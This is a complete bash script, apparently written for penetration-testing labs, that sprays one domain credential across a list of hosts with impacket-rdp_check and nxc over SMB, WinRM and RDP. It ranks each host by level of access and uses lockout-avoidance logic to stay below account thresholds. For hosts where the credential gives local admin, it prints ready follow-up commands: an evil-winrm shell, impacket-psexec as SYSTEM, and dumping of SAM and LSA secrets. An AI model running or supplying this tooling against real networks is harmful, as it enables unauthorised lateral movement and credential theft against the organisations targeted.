#!/usr/bin/env bash
# lateral-check.sh — two-stage credential validator for lateral movement
#
# Stage 1: impacket-rdp_check for protocol-level reliability (ph10nix is right —
#          it's quieter and confirms the cred actually negotiates RDP auth).
# Stage 2: nxc smb / winrm / rdp to figure out WHAT the access means
#          (local admin? domain user? RDP-only?).
#
# Output:
#   results.csv      — full structured log, one row per host
#   pwned.txt        — gold-tier hosts only (local admin via SMB or WinRM)
#   access.txt       — any-access hosts (RDP land, SMB read, WinRM connect)
#   stderr           — colored summary as it runs
#
# Lockout safety: stops the spray after MAX_FAILS consecutive auth failures
# so a wrong password doesn't burn through the file and lock the account.

set -uo pipefail

# ─── colors (defined early for prompts) ──────────────────────────────
if [ -t 1 ]; then
  R=$'\033[31m'; G=$'\033[32m'; Y=$'\033[33m'; B=$'\033[34m'; M=$'\033[35m'; C=$'\033[36m'; W=$'\033[37m'; D=$'\033[2m'; X=$'\033[0m'; BOLD=$'\033[1m'
else
  R=; G=; Y=; B=; M=; C=; W=; D=; X=; BOLD=
fi

# ─── args / interactive prompt ────────────────────────────────────────
usage() {
  cat <<EOF
Usage: $0 [<ips_file_or_single_ip> <DOMAIN/user> <password>]

Run with no args (or partial args) for interactive mode.

Examples:
  $0 ips.txt corp.com/stephanie 'LegmanTeamBenzoin!!'
  $0 192.168.1.50 corp.com/stephanie 'pass'    # single IP works too
  $0                                            # fully interactive

Env vars:
  MAX_FAILS=3      stop after N consecutive auth failures (lockout safety)
  SKIP_RDP=1       skip stage 1 (go straight to nxc)
  SKIP_NXC=1       skip stage 2 (impacket only)
  LOCAL_AUTH=1     pass --local-auth to nxc (workgroup / local accounts)
  OUTDIR=path      output dir (default: lateral-check-results/<timestamp>/)
EOF
}

# Read a value into a variable, with a default shown in dim text.
ask() {
  local varname="$1" prompt="$2" default="${3:-}"
  local input
  if [ -n "$default" ]; then
    printf "${C}?${X} %s ${D}[%s]${X}: " "$prompt" "$default" >&2
  else
    printf "${C}?${X} %s: " "$prompt" >&2
  fi
  read -r input
  if [ -z "$input" ] && [ -n "$default" ]; then
    input="$default"
  fi
  printf -v "$varname" '%s' "$input"
}

ask_secret() {
  local varname="$1" prompt="$2"
  local input
  printf "${C}?${X} %s: " "$prompt" >&2
  read -r -s input
  echo >&2
  printf -v "$varname" '%s' "$input"
}

# Help flag
case "${1:-}" in
  -h|--help|help) usage; exit 0 ;;
esac

IPS_INPUT="${1:-}"
USER_SPEC="${2:-}"
PASSWORD="${3:-}"

# Interactive fallback if anything is missing.
if [ -z "$IPS_INPUT" ] || [ -z "$USER_SPEC" ] || [ -z "$PASSWORD" ]; then
  printf "\n${BOLD}${C}── lateral-check interactive ──${X}\n\n" >&2

  if [ -z "$IPS_INPUT" ]; then
    ask IPS_INPUT "ips file path OR single IP" "ips.txt"
  fi

  if [ -z "$USER_SPEC" ]; then
    local_domain=""
    local_user=""
    ask local_domain "domain (use WORKGROUP for local accounts)" "corp.com"
    ask local_user   "username"
    USER_SPEC="${local_domain}/${local_user}"
  fi

  if [ -z "$PASSWORD" ]; then
    ask_secret PASSWORD "password"
  fi

  echo >&2
fi

# Validate user_spec format
if [[ "$USER_SPEC" != */* ]]; then
  echo "${R}error:${X} user must be in DOMAIN/user form (got: $USER_SPEC)" >&2
  exit 1
fi

# Resolve IPS_INPUT — if it's a file, use it; if it looks like an IP, make a temp file.
if [ -f "$IPS_INPUT" ]; then
  IPS_FILE="$IPS_INPUT"
elif [[ "$IPS_INPUT" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  IPS_FILE="$(mktemp)"
  echo "$IPS_INPUT" > "$IPS_FILE"
  trap 'rm -f "$IPS_FILE"' EXIT
else
  echo "${R}error:${X} '$IPS_INPUT' is neither a readable file nor a valid IP" >&2
  exit 1
fi

DOMAIN="${USER_SPEC%%/*}"
USER="${USER_SPEC##*/}"

MAX_FAILS="${MAX_FAILS:-3}"
SKIP_RDP="${SKIP_RDP:-0}"
SKIP_NXC="${SKIP_NXC:-0}"
LOCAL_AUTH="${LOCAL_AUTH:-0}"
OUTDIR="${OUTDIR:-}"

# Default: a timestamped run folder so each run is self-contained and never
# overwrites a previous one. Override with OUTDIR=... to pin a specific path.
if [ -z "$OUTDIR" ]; then
  RUN_TS="$(date +%Y%m%d_%H%M%S)"
  OUTDIR="lateral-check-results/${RUN_TS}"
fi

mkdir -p "$OUTDIR"
CSV="$OUTDIR/results.csv"
PWNED="$OUTDIR/pwned.txt"
ACCESS="$OUTDIR/access.txt"

# ─── prereqs ──────────────────────────────────────────────────────────
need() { command -v "$1" >/dev/null 2>&1 || { echo "missing: $1" >&2; exit 2; }; }
[ "$SKIP_RDP" = "1" ] || need impacket-rdp_check
[ "$SKIP_NXC" = "1" ] || need nxc
[ -r "$IPS_FILE" ] || { echo "cannot read $IPS_FILE" >&2; exit 2; }

# ─── csv header ───────────────────────────────────────────────────────
if [ ! -s "$CSV" ]; then
  echo "timestamp,ip,rdp_status,smb_status,winrm_status,rdp_nxc_status,verdict" > "$CSV"
fi

# Local-auth flag once.
LA_FLAG=()
[ "$LOCAL_AUTH" = "1" ] && LA_FLAG=(--local-auth)

# ─── core checks ──────────────────────────────────────────────────────
fails=0

# Single classifier shared by both tools. Maps raw command output to a status
# token. A plain successful connection is labelled differently per tool
# (impacket says GRANTED, nxc says OPEN), so the caller passes that label.
#   $1 = raw output   $2 = ok-token (GRANTED|OPEN)
# Order matters: LOCKED and PWNED are checked before generic success/deny.
classify() {
  local out="$1" ok="$2"
  if   grep -qi "STATUS_ACCOUNT_LOCKED_OUT"                                   <<<"$out"; then echo "LOCKED"
  elif grep -q  "Pwn3d!"                                                      <<<"$out"; then echo "PWNED"
  elif grep -qi "STATUS_LOGON_FAILURE\|authentication failure\|access.denied" <<<"$out"; then echo "DENIED"
  elif grep -q  "Access Granted"                                             <<<"$out"; then echo "$ok"
  elif grep -qE "\[\+\]"                                                     <<<"$out"; then echo "$ok"
  else echo "ERROR"
  fi
}

check_rdp_impacket() {
  classify "$(impacket-rdp_check "${DOMAIN}/${USER}:${PASSWORD}@${1}" 2>&1 || true)" GRANTED
}

check_nxc() {
  # $1 = proto (smb|winrm|rdp), $2 = ip
  classify "$(nxc "$1" "$2" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "${LA_FLAG[@]}" 2>&1 || true)" OPEN
}

verdict_of() {
  # $1=rdp(impacket) $2=smb $3=winrm $4=rdp_nxc
  local rdp="$1" smb="$2" winrm="$3" rdp_nxc="$4"
  if [ "$smb" = "PWNED" ] || [ "$winrm" = "PWNED" ]; then echo "GOLD"; return; fi
  if [ "$rdp" = "GRANTED" ] || [ "$rdp_nxc" = "OPEN" ] || [ "$rdp_nxc" = "PWNED" ] || [ "$smb" = "OPEN" ] || [ "$winrm" = "OPEN" ]; then echo "ACCESS"; return; fi
  if [ "$rdp" = "DENIED" ] && [ "$smb" = "DENIED" ] && [ "$winrm" = "DENIED" ]; then echo "DENIED"; return; fi
  echo "MIXED"
}

# ─── main loop ────────────────────────────────────────────────────────
total=0
gold=0
access=0
denied=0

# Tracking arrays for the final recap.
declare -a RECAP_IPS RECAP_RDP RECAP_SMB RECAP_WINRM RECAP_RDPNXC RECAP_VERDICT
declare -a GOLD_IPS ACCESS_IPS

printf "${D}output -> %s/${X}\n\n" "$OUTDIR" >&2

while IFS= read -r ip || [ -n "$ip" ]; do
  # skip blank lines and comments
  ip="${ip%%#*}"; ip="${ip// /}"
  [ -z "$ip" ] && continue
  total=$((total+1))

  printf "${D}── %s ──${X}\n" "$ip" >&2

  rdp="SKIP"; smb="SKIP"; winrm="SKIP"; rdp_nxc="SKIP"

  if [ "$SKIP_RDP" != "1" ]; then
    rdp="$(check_rdp_impacket "$ip")"
    case "$rdp" in
      GRANTED) printf "  ${G}impacket rdp_check: GRANTED${X}\n" >&2 ;;
      DENIED)  printf "  ${R}impacket rdp_check: DENIED${X}\n"  >&2 ;;
      LOCKED)  printf "  ${R}impacket rdp_check: LOCKED OUT${X}\n" >&2 ;;
      *)       printf "  ${Y}impacket rdp_check: ERROR${X}\n"   >&2 ;;
    esac
  fi

  if [ "$SKIP_NXC" != "1" ]; then
    smb="$(check_nxc smb "$ip")"
    winrm="$(check_nxc winrm "$ip")"
    rdp_nxc="$(check_nxc rdp "$ip")"

    color_for() { case "$1" in PWNED) echo "$M";; OPEN) echo "$G";; DENIED) echo "$R";; LOCKED) echo "$R";; *) echo "$Y";; esac; }
    printf "  $(color_for "$smb")nxc smb:    %-6s${X}    $(color_for "$winrm")nxc winrm:  %-6s${X}    $(color_for "$rdp_nxc")nxc rdp:    %-6s${X}\n" \
      "$smb" "$winrm" "$rdp_nxc" >&2
  fi

  # ── lockout safety ──
  if [ "$rdp" = "LOCKED" ] || [ "$smb" = "LOCKED" ] || [ "$winrm" = "LOCKED" ]; then
    printf "${R}${BOLD}!! ACCOUNT LOCKED OUT on %s — stopping${X}\n" "$ip" >&2
    echo "$(date -Is),$ip,$rdp,$smb,$winrm,$rdp_nxc,LOCKED" >> "$CSV"
    exit 3
  fi

  # ── consecutive-fail safety ──
  if [ "$rdp" = "DENIED" ] && [ "$smb" = "DENIED" ] && [ "$winrm" = "DENIED" ]; then
    fails=$((fails+1))
    if [ "$fails" -ge "$MAX_FAILS" ]; then
      printf "${R}!! %d consecutive auth failures — stopping (set MAX_FAILS=N to override)${X}\n" "$fails" >&2
      echo "$(date -Is),$ip,$rdp,$smb,$winrm,$rdp_nxc,STOP_FAILS" >> "$CSV"
      exit 4
    fi
  else
    fails=0
  fi

  verdict="$(verdict_of "$rdp" "$smb" "$winrm" "$rdp_nxc")"
  case "$verdict" in
    GOLD)    printf "  ${M}=> GOLD (local admin)${X}\n\n" >&2; gold=$((gold+1));     echo "$ip" >> "$PWNED"; echo "$ip" >> "$ACCESS"; GOLD_IPS+=("$ip"); ACCESS_IPS+=("$ip") ;;
    ACCESS)  printf "  ${G}=> access${X}\n\n"          >&2; access=$((access+1)); echo "$ip" >> "$ACCESS"; ACCESS_IPS+=("$ip") ;;
    DENIED)  printf "  ${R}=> denied${X}\n\n"          >&2; denied=$((denied+1)) ;;
    *)       printf "  ${Y}=> mixed${X}\n\n"           >&2 ;;
  esac

  # Stash for the end-of-run recap table.
  RECAP_IPS+=("$ip")
  RECAP_RDP+=("$rdp")
  RECAP_SMB+=("$smb")
  RECAP_WINRM+=("$winrm")
  RECAP_RDPNXC+=("$rdp_nxc")
  RECAP_VERDICT+=("$verdict")

  echo "$(date -Is),$ip,$rdp,$smb,$winrm,$rdp_nxc,$verdict" >> "$CSV"

done < "$IPS_FILE"

# ─── visual recap ─────────────────────────────────────────────────────

# Compact status cell — 4-char colored label.
cell() {
  case "$1" in
    PWNED)   printf "${M}${BOLD}PWN!${X}" ;;
    OPEN)    printf "${G}open${X}" ;;
    GRANTED) printf "${G} ok ${X}" ;;
    DENIED)  printf "${R}deny${X}" ;;
    LOCKED)  printf "${R}LOCK${X}" ;;
    ERROR)   printf "${Y} ?? ${X}" ;;
    SKIP)    printf "${D} -- ${X}" ;;
    *)       printf "${Y}%-4s${X}" "$1" ;;
  esac
}

verdict_cell() {
  case "$1" in
    GOLD)   printf "${M}${BOLD}★ GOLD${X}  " ;;
    ACCESS) printf "${G}access${X}  " ;;
    DENIED) printf "${R}denied${X}  " ;;
    MIXED)  printf "${Y}mixed ${X}  " ;;
    *)      printf "%-6s  " "$1" ;;
  esac
}

echo >&2
printf "${BOLD}${C}╔════════════════════════════════════════════════════════════════════╗${X}\n" >&2
printf "${BOLD}${C}║                          R E C A P                                 ║${X}\n" >&2
printf "${BOLD}${C}╚════════════════════════════════════════════════════════════════════╝${X}\n" >&2
echo >&2

# Table header
printf "  ${BOLD}%-17s  %-4s  %-4s  %-4s  %-4s   %s${X}\n" \
  "host" "rdpI" "smb" "wrm" "rdp" "verdict" >&2
printf "  ${D}%s${X}\n" "─────────────────  ────  ────  ────  ────   ───────" >&2

for i in "${!RECAP_IPS[@]}"; do
  printf "  %-17s  " "${RECAP_IPS[$i]}" >&2
  cell "${RECAP_RDP[$i]}"     >&2; printf "  " >&2
  cell "${RECAP_SMB[$i]}"     >&2; printf "  " >&2
  cell "${RECAP_WINRM[$i]}"   >&2; printf "  " >&2
  cell "${RECAP_RDPNXC[$i]}"  >&2; printf "   " >&2
  verdict_cell "${RECAP_VERDICT[$i]}" >&2
  echo >&2
done

# Legend
echo >&2
printf "  ${D}rdpI=impacket rdp_check · smb/wrm/rdp=nxc · PWN!=local admin · open=connect · deny=auth fail${X}\n" >&2

# Totals
echo >&2
printf "  total: %d   ${M}gold: %d${X}   ${G}access: %d${X}   ${R}denied: %d${X}\n" \
  "$total" "$gold" "$access" "$denied" >&2

# ─── next-steps block (only if we have anything to act on) ────────────
if [ "$gold" -gt 0 ]; then
  echo >&2
  printf "${BOLD}${M}── next steps for GOLD hosts ──${X}\n\n" >&2
  for ip in "${GOLD_IPS[@]}"; do
    printf "  ${M}● %s${X}\n" "$ip" >&2
    printf "      ${D}# interactive shell as %s:${X}\n" "$USER" >&2
    printf "      evil-winrm -i %s -u %s -p '%s'\n" "$ip" "$USER" "$PASSWORD" >&2
    printf "      ${D}# or PsExec-style as SYSTEM:${X}\n" >&2
    printf "      impacket-psexec '%s/%s:%s@%s'\n" "$DOMAIN" "$USER" "$PASSWORD" "$ip" >&2
    printf "      ${D}# dump SAM + LSA secrets:${X}\n" >&2
    printf "      nxc smb %s -u %s -p '%s' -d %s --sam --lsa\n\n" "$ip" "$USER" "$PASSWORD" "$DOMAIN" >&2
  done
fi

if [ "$access" -gt 0 ]; then
  printf "${BOLD}${G}── access-only hosts (no local admin) ──${X}\n\n" >&2
  for ip in "${ACCESS_IPS[@]}"; do
    # Skip ones already shown as GOLD.
    is_gold=0
    for g in "${GOLD_IPS[@]:-}"; do [ "$g" = "$ip" ] && is_gold=1 && break; done
    [ "$is_gold" = "1" ] && continue
    printf "  ${G}● %s${X}  ${D}# rdesktop or xfreerdp for interactive shell, then privesc${X}\n" "$ip" >&2
  done
  echo >&2
fi

# ─── file pointers ────────────────────────────────────────────────────
printf "${D}files:${X}\n" >&2
printf "  results -> %s\n" "$CSV"    >&2
[ "$gold"   -gt 0 ] && printf "  ${M}pwned   -> %s${X}\n" "$PWNED"  >&2
[ "$access" -gt 0 ] && printf "  ${G}access  -> %s${X}\n" "$ACCESS" >&2
